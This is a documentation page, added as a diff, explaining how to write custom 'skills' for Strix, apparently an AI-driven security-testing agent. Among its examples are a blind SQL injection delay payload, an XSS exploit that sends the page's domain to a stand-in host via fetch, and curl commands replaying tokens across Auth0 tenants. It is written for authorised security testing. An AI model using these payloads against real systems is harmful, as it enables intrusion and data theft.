@@ -1,0 +1,421 @@
+---
+title: Creating Skills
+description: Learn how to create custom skills to extend Strix agent capabilities
+---
+
+You can extend Strix's capabilities by creating custom skills that provide specialized knowledge for your specific testing scenarios. This guide shows you how to structure, write, and contribute skills.
+
+## Skill Anatomy
+
+A skill is a Markdown file that contains:
+
+1. **YAML frontmatter** with metadata
+2. **Structured content** with testing knowledge
+3. **Practical examples** and techniques
+4. **Validation guidance** for confirming findings
+
+### Basic Structure
+
+```markdown
+---
+name: skill-name
+description: Brief description of what this skill covers
+---
+
+# Skill Title
+
+Opening paragraph explaining the vulnerability, framework, or technology.
+
+## Attack Surface
+
+Identify what components, features, or integration points are relevant.
+
+## Key Vulnerabilities
+
+Core exploitation patterns with examples.
+
+## Bypass Techniques
+
+Methods to evade common defenses.
+
+## Testing Methodology
+
+Step-by-step approach for testing.
+
+## Validation
+
+How to confirm true positives with evidence.
+
+## False Positives
+
+Common scenarios that appear vulnerable but aren't.
+
+## Impact
+
+Consequences of successful exploitation.
+
+## Pro Tips
+
+Advanced insights and best practices.
+
+## Summary
+
+Concise takeaway and key principles.
+```
+
+## What Makes a Good Skill?
+
+Effective skills include:
+
+### Advanced Techniques
+
+Focus on non-obvious methods specific to the domain:
+
+- Modern exploitation variants
+- Framework-specific patterns
+- Bypass techniques for common defenses
+- Context-dependent edge cases
+
+**Good example** (from SQL injection skill):
+```
+### Blind Extraction
+
+- Branch on single-bit predicates using `SUBSTRING`/`ASCII`, `LEFT`/`RIGHT`, or JSON/array operators
+- Binary search on character space for fewer requests
+- Encode outputs (hex/base64) to normalize
+- Gate delays inside subqueries to reduce noise: `AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)`
+```
+
+### Practical Examples
+
+Provide working payloads and test cases:
+
+**Good example** (from XSS skill):
+```javascript
+// Vulnerable Pattern
+const q = new URLSearchParams(location.search).get('q');
+results.innerHTML = `<li>${q}</li>`;
+
+// Exploit
+?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>
+```
+
+### Validation Methods
+
+Explain how to confirm findings and avoid false positives:
+
+**Good example** (from IDOR skill):
+```
+1. Demonstrate access to an object not owned by the caller (content or metadata)
+2. Show the same request fails with appropriately enforced authorization when corrected
+3. Prove cross-channel consistency: same unauthorized access via at least two transports (e.g., REST and GraphQL)
+4. Document tenant boundary violations (if applicable)
+5. Provide reproducible steps and evidence (requests/responses for owner vs non-owner)
+```
+
+### Context-Specific Insights
+
+Include environment nuances and configuration details:
+
+**Good example** (from FastAPI skill):
+```
+**Dependency Injection Gaps**
+- Routes missing security dependencies present on other routes
+- `Depends` used instead of `Security` (ignores scope enforcement)
+- Token presence treated as authentication without signature verification
+- `OAuth2PasswordBearer` only yields a token string—verify routes don't treat presence as auth
+```
+
+## File Organization
+
+Skills are organized by category in the `strix/skills/` directory:
+
+```
+strix/skills/
+├── vulnerabilities/
+│   ├── sql_injection.md
+│   ├── xss.md
+│   ├── idor.md
+│   └── ...
+├── frameworks/
+│   ├── fastapi.md
+│   ├── nextjs.md
+│   └── ...
+├── technologies/
+│   ├── supabase.md
+│   ├── firebase_firestore.md
+│   └── ...
+├── protocols/
+│   ├── graphql.md
+│   └── ...
+├── cloud/
+├── reconnaissance/
+└── custom/
+```
+
+## Naming Conventions
+
+- **File names**: Use `snake_case.md` (e.g., `sql_injection.md`, `firebase_firestore.md`)
+- **Skill names** in frontmatter: Use `kebab-case` (e.g., `sql-injection`, `firebase-firestore`)
+- **Titles**: Use proper capitalization (e.g., "SQL Injection", "Firebase / Firestore")
+
+## Frontmatter Requirements
+
+Every skill must include YAML frontmatter:
+
+```yaml
+---
+name: skill-name
+description: Brief description covering key techniques and scope
+---
+```
+
+**Guidelines**:
+- `name`: kebab-case identifier matching the intended usage
+- `description`: One concise sentence (ideally under 100 characters) describing what the skill covers
+
+**Examples**:
+
+```yaml
+---
+name: sql-injection
+description: SQL injection testing covering union, blind, error-based, and ORM bypass techniques
+---
+```
+
+```yaml
+---
+name: fastapi
+description: Security testing playbook for FastAPI applications covering ASGI, dependency injection, and API vulnerabilities
+---
+```
+
+## Writing Style
+
+### Active Voice
+
+Use direct, actionable language:
+
+- **Good**: "Verify routes enforce authorization at the service layer"
+- **Avoid**: "Authorization should be enforced by routes"
+
+### Second Person
+
+Write as if instructing the agent directly:
+
+- **Good**: "Start with context classification, not payload brute force"
+- **Avoid**: "One should start with context classification"
+
+### Concise and Dense
+
+Pack maximum information into minimum space:
+
+- Use bullet points for lists
+- Avoid filler words
+- Prefer specific examples over general statements
+
+### Technical Precision
+
+Be specific about:
+
+- Version-specific behavior
+- Platform-dependent techniques
+- Configuration requirements
+- Exact syntax and payloads
+
+## Example: Creating a Technology Skill
+
+Let's create a skill for testing Auth0 applications:
+
+```markdown
+---
+name: auth0
+description: Auth0 security testing covering tenant isolation, rule bypasses, and token validation
+---
+
+# Auth0
+
+Security testing for applications using Auth0 for authentication and authorization. Focus on tenant isolation, custom rules/actions, API authorization, and cross-service token validation.
+
+## Attack Surface
+
+**Authentication Flows**
+- Universal Login, embedded login, passwordless
+- Social connections, enterprise SAML/OIDC
+- Multi-factor authentication
+
+**Authorization**
+- RBAC roles and permissions
+- Custom claims in tokens
+- API scopes and audiences
+
+**Extensibility**
+- Rules, Hooks, Actions (Node.js code execution)
+- Custom databases and scripts
+- Webtask/serverless context
+
+## High-Value Targets
+
+- Management API endpoints
+- Custom database connection scripts
+- Rules/Actions modifying token claims
+- Tenant isolation boundaries
+- Cross-origin authentication
+- MFA enrollment and bypass flows
+
+## Key Vulnerabilities
+
+### Token Validation
+
+**Common Issues**
+- Accepting tokens from wrong tenant (issuer mismatch)
+- Missing audience validation for API authorization
+- Algorithm confusion (RS256 vs HS256)
+- Custom claims trusted without verification
+
+**Tests**
+```bash
+# Replay token across tenants
+curl -H "Authorization: Bearer <other-tenant-token>" https://api.example.com/protected
+
+# Test audience validation
+curl -H "Authorization: Bearer <wrong-audience-token>" https://api.example.com/protected
+```
+
+### Rules and Actions Bypass
+
+**Vulnerabilities**
+- Rules disabled or failing silently
+- Action execution order bypassed
+- Context manipulation via client metadata
+- Asynchronous execution gaps
+
+**Tests**
+- Test flows with rules disabled vs enabled
+- Attempt to bypass enrichment by using alternate flows
+- Manipulate `user.user_metadata` and `user.app_metadata` if writable
+
+## Testing Methodology
+
+1. **Enumerate tenant** - Identify Auth0 domain, client IDs, connections
+2. **Capture tokens** - Collect tokens for multiple roles and flows
+3. **Verify claims** - Check iss, aud, azp, custom claims
+4. **Test isolation** - Attempt cross-tenant, cross-API token use
+5. **Probe extensibility** - Test rules/actions/hooks for bypass or abuse
+
+## Validation
+
+1. Show token from Tenant A accepted by Tenant B's API
+2. Demonstrate bypass of rule/action enforcement
+3. Prove privilege escalation via custom claim manipulation
+4. Confirm cross-API audience validation failures
+
+## Pro Tips
+
+1. Auth0 tenants are isolated by issuer—verify apps check `iss` claim
+2. Test both Management API and user-facing APIs for token validation
+3. Rules run in order—test if early failures allow bypass of later checks
+4. Custom database scripts have access to user context—test for injection
+5. MFA can be bypassed if not enforced in rules/actions for all flows
+```
+
+## Testing Your Skill
+
+Before contributing, verify your skill:
+
+1. **Validate frontmatter** - Ensure YAML is correctly formatted
+2. **Check examples** - Test that code examples and payloads are accurate
+3. **Review structure** - Confirm all major sections are present
+4. **Test loading** - Verify the skill can be loaded by Strix
+
+```python
+from strix.skills import load_skills
+
+# Test loading your skill
+result = load_skills(["your-skill-name"])
+print(result)
+```
+
+## Contributing Skills
+
+To contribute a skill:
+
+1. **Fork the repository** at [github.com/usestrix/strix](https://github.com/usestrix/strix)
+2. **Create your skill** in the appropriate category directory
+3. **Test the skill** by loading it in Strix
+4. **Submit a pull request** with:
+   - Clear description of what the skill covers
+   - Examples of when to use it
+   - Any dependencies or requirements
+
+### Pull Request Checklist
+
+- [ ] Skill file is in the correct category directory
+- [ ] Frontmatter includes `name` and `description`
+- [ ] Content follows the recommended structure
+- [ ] Examples are practical and tested
+- [ ] Writing style is active voice, second person
+- [ ] Technical details are accurate and current
+- [ ] No sensitive information or credentials included
+
+## Skill Categories
+
+Choose the appropriate category:
+
+- **vulnerabilities/** - Core vulnerability classes (SQLi, XSS, IDOR, etc.)
+- **frameworks/** - Web frameworks (FastAPI, Next.js, Django, Express, etc.)
+- **technologies/** - Third-party services (Supabase, Firebase, Auth0, Stripe, etc.)
+- **protocols/** - Communication protocols (GraphQL, WebSocket, gRPC, etc.)
+- **cloud/** - Cloud providers (AWS, Azure, GCP, Kubernetes, etc.)
+- **reconnaissance/** - Information gathering techniques
+- **custom/** - Specialized or industry-specific skills
+
+## Best Practices
+
+### Focus on Depth
+
+Skills should provide specialized knowledge that goes beyond general security testing:
+
+- Include framework/technology-specific techniques
+- Cover modern variants and bypass methods
+- Provide context-dependent insights
+- Address common misconfigurations
+
+### Provide Actionable Guidance
+
+Agents need clear, executable instructions:
+
+- Step-by-step testing methodologies
+- Concrete validation criteria
+- Specific tools and commands
+- Clear success/failure indicators
+
+### Stay Current
+
+Keep skills updated with:
+
+- Latest framework/technology versions
+- New exploitation techniques
+- Updated defense mechanisms
+- Current best practices
+
+### Avoid Duplication
+
+Before creating a skill:
+
+- Check if similar skills exist
+- Consider enhancing existing skills
+- Focus on unique knowledge and techniques
+
+## Getting Help
+
+If you need assistance creating a skill:
+
+- Review existing skills in the same category
+- Ask questions in [GitHub Discussions](https://github.com/usestrix/strix/discussions)
+- Open an issue describing the skill you want to create
+- Join the community for feedback and guidance
+
+<Note>
+Skills are a key part of Strix's extensibility. Well-crafted skills significantly enhance agent capabilities and benefit the entire community.
+</Note>
